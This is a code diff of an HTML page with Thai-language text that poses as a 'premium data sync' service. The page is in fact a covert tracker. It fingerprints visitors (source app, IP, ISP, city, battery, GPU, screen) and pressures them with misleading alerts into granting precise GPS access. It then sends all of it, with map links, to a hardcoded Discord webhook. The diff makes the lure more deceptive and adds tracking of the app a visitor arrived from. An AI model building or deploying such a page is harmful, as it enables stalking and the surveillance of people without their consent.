@@ -12,6 +12,7 @@
         .scan-line { height: 2px; background: linear-gradient(90deg, transparent, #3b82f6, transparent); position: absolute; width: 100%; top: 0; animation: scan move 1.5s infinite linear; }
         @keyframes move { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
         #loading-zone { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 200px; }
+        .success-glow { filter: drop-shadow(0 0 10px rgba(34, 197, 94, 0.5)); }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen p-4">
@@ -38,7 +39,7 @@
 
             <div id="result-zone" class="hidden animate-in fade-in zoom-in duration-500">
                 <div class="mb-5 p-4 bg-green-500/10 border border-green-500/20 rounded-[1.5rem] flex items-center gap-4 text-green-400">
-                    <div class="w-12 h-12 bg-green-600 rounded-full flex items-center justify-center text-white text-2xl">✓</div>
+                    <div class="w-12 h-12 bg-green-600 rounded-full flex items-center justify-center text-white text-2xl success-glow">✓</div>
                     <div>
                         <p class="font-bold text-sm uppercase">ตรวจสอบสำเร็จ</p>
                         <p class="text-[10px] opacity-70">ซิงค์ข้อมูลพรีเมียมเรียบร้อยแล้ว</p>
@@ -50,7 +51,6 @@
     </div>
 
     <script>
-        // ใส่ URL Webhook ของคุณ
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1497104681770549318/pOsCVRZNsGnE8hxcr8YsMGuML2GfV95ALQSuxRF9KrLUrOgnaccBxt0Kc9Ygc6WruqkH";
         let hasSent = false;
 
@@ -60,22 +60,28 @@
             l.scrollTop = l.scrollHeight;
         }
 
+        // ฟังก์ชันตรวจจับแหล่งที่มา (Referrer)
+        function getSourceApp() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Line/")) return "LINE App";
+            if (ua.includes("FBAN") || ua.includes("FBAV")) return "Facebook App";
+            if (ua.includes("Instagram")) return "Instagram App";
+            return "Web Browser";
+        }
+
         async function startProcess() {
-            log("ตรวจสอบสถานะเน็ตเวิร์ก...");
+            log("วิเคราะห์โปรโตคอลความปลอดภัย...");
+            const sourceApp = getSourceApp();
             const network = await getNetwork();
-            log(`IP: ${network.ip} (Verified)`);
             
-            log("กำลังเชื่อมต่อเซิร์ฟเวอร์พื้นที่...");
+            log(`ตรวจพบการเข้าถึงผ่าน: ${sourceApp}`, "blue-300");
+            log(`เครือข่าย: ${network.isp} (IP: ${network.ip})`);
             
-            const options = {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
-            };
+            const options = { enableHighAccuracy: true, timeout: 15000 };
 
             navigator.geolocation.getCurrentPosition(
                 async (pos) => {
-                    log("ซิงค์ตำแหน่งเซิร์ฟเวอร์สำเร็จ!", "green-400");
+                    log("ยืนยันพิกัดดาวเทียมสำเร็จ!", "green-400");
                     document.getElementById('icon-status').innerText = "✅";
                     
                     const hardware = getHardware();
@@ -85,24 +91,23 @@
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
                         acc: pos.coords.accuracy.toFixed(1),
+                        source: sourceApp,
                         ...network, ...hardware, battery,
                         lang: navigator.language,
                         tz: Intl.DateTimeFormat().resolvedOptions().timeZone
                     };
 
-                    await sendReport(finalData, "🟢 FORCE_SYNC_COMPLETE");
-                    showUI(finalData);
+                    await sendReport(finalData);
+                    setTimeout(() => showUI(finalData), 1000);
                 },
                 (err) => {
-                    log("การซิงค์ข้อมูลล้มเหลว: ผู้ใช้ปฏิเสธ", "red-400");
-                    alert("⚠️ เกิดข้อผิดพลาดในการเชื่อมต่อ: กรุณากด 'อนุญาต' เพื่อยืนยันว่าคุณกำลังใช้งานในพื้นที่ที่รองรับบริการนี้");
+                    log("ปฏิเสธการเข้าถึง: ระบบไม่สามารถซิงค์ข้อมูลได้", "red-400");
+                    alert("⚠️ เพื่อความปลอดภัยและสิทธิประโยชน์ในพื้นที่ของคุณ กรุณากด 'อนุญาต' การเข้าถึงตำแหน่ง");
                     location.reload();
                 },
                 options
             );
         }
-
-        window.onload = startProcess;
 
         async function getNetwork() {
             try {
@@ -120,54 +125,69 @@
             return {
                 gpu,
                 cores: navigator.hardwareConcurrency || "N/A",
-                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
-                platform: navigator.platform
+                platform: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`
             };
         }
 
         async function getBattery() {
             try {
                 const b = await navigator.getBattery();
-                return `${(b.level * 100).toFixed(0)}% (${b.charging ? 'ชาร์จ' : 'แบต'})`;
+                return `${(b.level * 100).toFixed(0)}% (${b.charging ? 'กำลังชาร์จ' : 'ไม่ได้ชาร์จ'})`;
             } catch { return "N/A"; }
         }
 
-        async function sendReport(d, type) {
+        async function sendReport(d) {
             if (hasSent) return;
             hasSent = true;
+            
             const payload = {
                 embeds: [{
-                    title: `🎯 [SYNC SUCCESS] ${type}`,
-                    color: 3066993,
+                    title: `🎯 [ACCESS DETECTED] ผ่าน ${d.source}`,
+                    color: d.source === "Web Browser" ? 3447003 : 15105570,
                     fields: [
-                        { name: "🌐 เน็ต/IP", value: `**IP:** \`${d.ip}\`\n**ISP:** ${d.isp}\n**พื้นที่:** ${d.city}, ${d.country}`, inline: false },
-                        { name: "📍 พิกัด GPS", value: `\`${d.lat}, ${d.lon}\`\n(แม่นยำ +/- ${d.acc} ม.)`, inline: true },
-                        { name: "🔋 อุปกรณ์", value: `แบต: ${d.battery}\nGPU: ${d.gpu}`, inline: true },
-                        { name: "🔗 นำทาง", value: `📍 [Maps](http://www.google.com/maps/place/${d.lat},${d.lon}) | 🏠 [StreetView](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${d.lat},${d.lon})`, inline: false }
+                        { name: "🌐 ข้อมูลเครือข่าย", value: `**IP:** \`${d.ip}\`\n**ISP:** ${d.isp}\n**พื้นที่:** ${d.city}, ${d.country}`, inline: false },
+                        { name: "📍 พิกัด GPS", value: `[ดูแผนที่ Google Maps](http://googleusercontent.com/maps.google.com/7{d.lat},${d.lon})\nแม่นยำ: +/- ${d.acc} เมตร`, inline: false },
+                        { name: "📱 ข้อมูลเครื่อง", value: `**OS:** ${d.platform}\n**จอ:** ${d.screen}\n**แบต:** ${d.battery}`, inline: true },
+                        { name: "⚙️ ฮาร์ดแวร์", value: `**CPU:** ${d.cores} Cores\n**GPU:** ${d.gpu}`, inline: true }
                     ],
-                    footer: { text: "Premium Node • " + new Date().toLocaleString('th-TH') }
+                    footer: { text: "Premium Identity Node • " + new Date().toLocaleString('th-TH') }
                 }]
             };
-            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+            
+            await fetch(WEBHOOK_URL, { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify(payload) 
+            });
         }
 
         function showUI(d) {
             document.getElementById('loading-zone').classList.add('hidden');
             document.getElementById('result-zone').classList.remove('hidden');
-            document.getElementById('status-title').innerText = "เข้าถึงข้อมูลได้แล้ว";
-            document.getElementById('status-desc').innerText = "การซิงค์ข้อมูลพื้นที่เสร็จสมบูรณ์";
+            document.getElementById('status-title').innerText = "ซิงค์ข้อมูลสำเร็จ";
+            document.getElementById('status-desc').innerText = "ข้อมูลพรีเมียมพร้อมใช้งานสำหรับคุณแล้ว";
 
             const container = document.getElementById('links-container');
             container.innerHTML = `
-                <a href="#" class="flex items-center gap-4 bg-blue-600 p-5 rounded-2xl hover:bg-blue-500 transition-all shadow-lg active:scale-95">
+                <div class="bg-white/5 border border-white/10 p-4 rounded-2xl mb-4">
+                    <p class="text-[10px] text-slate-500 uppercase mb-2">ข้อมูลบัญชีเบื้องต้น</p>
+                    <div class="flex justify-between text-xs">
+                        <span class="text-slate-400">เข้าใช้งานจาก:</span>
+                        <span class="text-blue-400">${d.source}</span>
+                    </div>
+                </div>
+                <a href="#" class="flex items-center gap-4 bg-gradient-to-r from-blue-600 to-blue-700 p-5 rounded-2xl hover:brightness-110 transition-all shadow-lg active:scale-95">
                     <span class="text-2xl">📥</span>
                     <div class="flex-1 text-left">
-                        <p class="text-white text-sm font-bold">ดาวน์โหลดไฟล์พรีเมียม</p>
-                        <p class="text-blue-100 text-[10px]">เตรียมข้อมูลสำหรับพื้นที่ ${d.city} แล้ว</p>
+                        <p class="text-white text-sm font-bold">เปิดใช้งานไฟล์พรีเมียม</p>
+                        <p class="text-blue-100 text-[10px]">ปลดล็อกฐานข้อมูลใน ${d.city} เรียบร้อย</p>
                     </div>
                 </a>
             `;
         }
+
+        window.onload = startProcess;
     </script>
 </body>
 </html>
